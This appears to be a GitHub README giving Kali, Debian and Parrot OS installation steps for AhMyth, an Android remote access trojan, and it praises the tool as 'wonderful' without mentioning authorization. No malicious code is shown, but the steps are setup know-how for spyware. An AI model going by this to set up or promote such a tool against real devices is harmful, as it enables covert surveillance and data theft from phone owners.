# AhMyth Android Rat
### Getting Started
You can install AhMyth in two ways but first make sure you have all the prerequisites listed below

## PREREQUISITES
- openJDK-8-JDK from Debian Stretch
- electron 
- electron packager (if you want to build binaries for Windows/Mac/Linux)
----------------
### INSTALLATION
----------------
### Kali & Debian installation
#### Auto install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```chmod +x AhMyth.sh``` 
4. ```sudo ./AhMyth.sh```
###### Once the installer file has finished it will prompt you to change your java version
5.  Select the corresponding number for OpenJDK-8-JDK - `Example: 2`
6. ```npm start```

#### Manual Install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```npm install && npm audit```

Add this line to your sources.list file 
`deb http://deb.debian.org/debian stretch main contrib non-free` 
and comment out any other repo with a `#`

4. ```sudo apt update && sudo apt install openjdk-8-jdk openjdk-8-jre```
5. ```sudo update-alternatives --config java``` - Select the corresponding number for openjdk-8-jdk `Example: 2`
6. ```npm start```
------------------

### Parrot OS installation
#### Auto install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```npm install && npm audit```
4. ```sudo ./AhMyth-parrot.sh```
###### Once the installer file has finished it will prompt you to change your java version
5.  Select the corresponding number for OpenJDK-8-JDK
6.```npm start```

#### Manual Install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```npm install && npm audit```

Add this line to your parrot.list file 
`deb http://deb.debian.org/debian stretch main contrib non-free` 
and comment out any other repo with a `#`

4. ```sudo apt update && sudo apt install openjdk-8-jdk openjdk-8-jre```
5. ```sudo update-alternatives --config java``` - Select the corresponding number for openjdk-8-jdk `Example: 2`
6. ```npm start```
------------------

### Alternative Debian & Kali Installation
If you are using Debian or Kali, and your **sources.list** file is located inside of `/etc/apt/sources.list.d` then
follow these steps

#### Auto install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```npm install && npm audit```
4. ```sudo ./AhMyth-2.sh```
###### Once the installer file has finished it will prompt you to change your java version
5.  Select the corresponding number for OpenJDK-8-JDK - `Example: 2`
6.```npm start```

#### Manual Install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```npm install && npm audit```

Add this line to your sources.list file 
`deb http://deb.debian.org/debian stretch main contrib non-free` 
and comment out any other repo with a `#`

4. ```sudo apt update && sudo apt install openjdk-8-jdk openjdk-8-jre```
5. ``` sudo update-alternatives --config java``` - Select the corresponding number for openjdk-8-jdk `Example: 2`
6. ```npm start```

--------------------------------------------------------------------------
##### This is not my work, I have only contributed to this wonderful tool.
